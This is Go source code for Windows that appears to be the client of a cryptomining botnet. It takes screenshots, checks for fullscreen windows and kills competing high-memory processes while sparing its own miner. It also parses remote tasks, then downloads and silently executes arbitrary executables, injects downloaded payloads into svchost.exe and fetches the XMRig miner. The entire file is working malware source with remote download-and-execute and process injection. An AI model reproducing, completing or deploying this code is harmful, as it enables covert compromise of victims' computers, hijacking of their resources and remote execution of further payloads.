package main

import (
	"bytes"
	"crypto/rand"
	"encoding/base64"
	"fmt"
	"image/png"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"
	"unsafe"

	"github.com/kbinani/screenshot"
	"golang.org/x/sys/windows"
)

func generateRandomString(length int) (string, error) {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	bytes := make([]byte, length)
	if _, err := rand.Read(bytes); err != nil {
		return "", err
	}
	for i := range bytes {
		bytes[i] = charset[bytes[i]%byte(len(charset))]
	}
	return string(bytes), nil
}

func takeScreenshot() string {
	// Capture the primary screen (0 for the first screen, 1 for the second, etc.)
	img, err := screenshot.CaptureDisplay(0)
	if err != nil {
		return ""
	}

	// Create a buffer to hold the encoded image data
	var buf bytes.Buffer

	// Encode the image as PNG and write to the buffer
	if err := png.Encode(&buf, img); err != nil {
		return ""
	}

	return base64.StdEncoding.EncodeToString(buf.Bytes())
}

var (
	user32                  = syscall.NewLazyDLL("user32.dll")
	procGetWindowRect       = user32.NewProc("GetWindowRect")
	procGetForegroundWindow = user32.NewProc("GetForegroundWindow")
	procGetSystemMetrics    = user32.NewProc("GetSystemMetrics")
)

type ProcessMemoryCounters struct {
	Cb                         uint32
	PageFaultCount             uint32
	PeakWorkingSetSize         uintptr
	WorkingSetSize             uintptr
	QuotaPeakPagedPoolUsage    uintptr
	QuotaPagedPoolUsage        uintptr
	QuotaPeakNonPagedPoolUsage uintptr
	QuotaNonPagedPoolUsage     uintptr
	PagefileUsage              uintptr
	PeakPagefileUsage          uintptr
	PrivateUsage               uintptr // This is the private bytes
}

type RECT struct {
	Left, Top, Right, Bottom int32
}

// GetWindowRect retrieves the dimensions of the specified window.
func getWindowRect(hWnd uintptr) (RECT, error) {
	var rect RECT
	r, _, err := procGetWindowRect.Call(hWnd, uintptr(unsafe.Pointer(&rect)))
	if r == 0 {
		return rect, err
	}
	return rect, nil
}

// GetForegroundWindow retrieves a handle to the window that is currently in the foreground.
func getForegroundWindow() uintptr {
	r, _, _ := procGetForegroundWindow.Call()
	return r
}

// GetSystemMetrics retrieves system metrics, such as screen width and height.
func getSystemMetrics(index int) int32 {
	r, _, _ := procGetSystemMetrics.Call(uintptr(index))
	return int32(r)
}

// isForegroundFullScreen checks if the currently active (foreground) window is in fullscreen mode.
func isForegroundFullScreen() bool {
	hWnd := getForegroundWindow()
	if hWnd == 0 {
		return false
	}

	rect, err := getWindowRect(hWnd)
	if err != nil {
		return false
	}

	screenWidth := getSystemMetrics(0)
	screenHeight := getSystemMetrics(1)

	// Check if the window size matches the screen size to infer fullscreen.
	if rect.Right-rect.Left == screenWidth && rect.Bottom-rect.Top == screenHeight {
		return true
	}

	return false
}

// acquireLock tries to create and lock a file. Returns true if successful.
func acquireLock(filePath string) bool {
	var err error
	handle, err := windows.CreateFile(
		windows.StringToUTF16Ptr(filePath),
		windows.GENERIC_READ|windows.GENERIC_WRITE,
		0,
		nil,
		windows.CREATE_ALWAYS,
		windows.FILE_ATTRIBUTE_NORMAL,
		0,
	)
	if err != nil {
		fmt.Printf("Failed to open lock file: %v\n", err)
		return false
	}

	lockHandle = handle
	return true
}

// cleanup releases the lock and removes the lock file.
func cleanup() {
	if lockHandle != 0 {
		windows.CloseHandle(lockHandle)
	}
}

func killMalware(enable string, minerpid uint32) {
	if enable == "1" {
		// Define the process names to filter
		targetProcesses := []string{"svchost.exe", "conhost.exe", "nslookup.exe", "cmd.exe", "dwm.exe", "notepad.exe", "explorer.exe"}
		thresholdGB := 1.5 // Memory threshold in GB

		handle, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
		if err != nil {
			fmt.Printf("Failed to create process snapshot: %v\n", err)
			return
		}
		defer windows.CloseHandle(handle)

		var procEntry windows.ProcessEntry32
		procEntry.Size = uint32(unsafe.Sizeof(procEntry))

		if err := windows.Process32First(handle, &procEntry); err != nil {
			fmt.Printf("Failed to retrieve first process: %v\n", err)
			return
		}

		for {
			processName := windows.UTF16ToString(procEntry.ExeFile[:])
			for _, target := range targetProcesses {
				if processName == target {
					fmt.Println("Target found.")
					checkProcessMemory(procEntry.ProcessID, processName, thresholdGB, minerpid)
				}
			}

			err := windows.Process32Next(handle, &procEntry)
			if err != nil {
				break
			}
		}

	} else {
		return
	}

}

func checkProcessMemory(pid uint32, processName string, thresholdGB float64, safepid uint32) {
	if pid != safepid {
		handle, _ := windows.OpenProcess(windows.PROCESS_QUERY_INFORMATION|windows.PROCESS_VM_READ, false, pid)
		defer windows.CloseHandle(handle)

		var memCounters ProcessMemoryCounters
		memCounters.Cb = uint32(unsafe.Sizeof(memCounters))
		proc := syscall.NewLazyDLL("psapi.dll").NewProc("GetProcessMemoryInfo")

		ret, _, _ := proc.Call(uintptr(handle), uintptr(unsafe.Pointer(&memCounters)), uintptr(memCounters.Cb))
		if ret == 0 {
			fmt.Printf("Failed to get memory info for %s (PID: %d):\n", processName, pid)
			return
		}

		privateBytesGB := float64(memCounters.PrivateUsage) / (1024 * 1024 * 1024)
		if privateBytesGB > thresholdGB {

			process, err := os.FindProcess(int(pid))
			if err != nil {
				fmt.Printf("Failed to find process with PID %d: %v\n", pid, err)
				return
			}

			err = process.Kill()
			if err != nil {
				fmt.Printf("Failed to kill process with PID %d: %v\n", pid, err)
				return
			}
			fmt.Printf("Process: %s (PID: %d) exceeds threshold with %.2f GB\n", processName, pid, privateBytesGB)
		}
	}
	fmt.Printf("Safe PID Detected: %d", int(safepid))

}

func HandleTask(task string) {
	tasksplit := strings.Split(task, "|")
	switch tasksplit[1] {
	case "download":
		downloadweb(tasksplit[2])
	case "inject":
		injectweb(tasksplit[2])
	case "NOTASK":
		return
	}

}

func downloadweb(url string) {
	parts := strings.Split(url, "/")
	fileName := parts[len(parts)-1]
	extension := filepath.Ext(fileName)
	if extension == "" {
		extension = ".exe"
	}

	// Generate a random file name
	randString, err := generateRandomString(8)
	if err != nil {
		return
	}

	tempDir := os.TempDir()
	tempFileName := fmt.Sprintf("vulp-%s%s", randString, extension)
	tempFilePath := filepath.Join(tempDir, tempFileName)

	// Create the file
	out, err := os.Create(tempFilePath)
	if err != nil {
		return
	}
	defer out.Close()

	// Get the data
	resp, err := http.Get(url)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	// Check server response
	if resp.StatusCode != http.StatusOK {
		return
	}

	// Write the body to file
	if _, err = io.Copy(out, resp.Body); err != nil {
		return
	}

	Exec := exec.Command("cmd", "/C", tempFilePath)
	Exec.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	Exec.Start()

}

func injectweb(url string) {
	parts := strings.Split(url, "/")
	fileName := parts[len(parts)-1]
	extension := filepath.Ext(fileName)
	if extension == "" {
		extension = ".exe"
	}

	// Get the data
	resp, err := http.Get(url)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	// Check server response
	if resp.StatusCode != http.StatusOK {
		return
	}

	// Read the body into a buffer
	buf := new(bytes.Buffer)
	if _, err = io.Copy(buf, resp.Body); err != nil {
		return
	}
	fmt.Println(len(buf.Bytes()))

	pi := Inject("C:\\Windows\\System32\\svchost.exe", buf.Bytes(), StringToPointer(""))
	fmt.Printf("Injected process running under PID: %d\n", pi.ProcessId)
}

func downloadxmrig(url string) []byte {

	// Get the data
	resp, err := http.Get(url)
	if err != nil {
		return nil
	}
	defer resp.Body.Close()

	// Check server response
	if resp.StatusCode != http.StatusOK {
		return nil
	}

	// Read the body into a buffer
	buf := new(bytes.Buffer)
	if _, err = io.Copy(buf, resp.Body); err != nil {
		return nil
	}
	//fmt.Println(len(buf.Bytes()))
	return buf.Bytes()
}
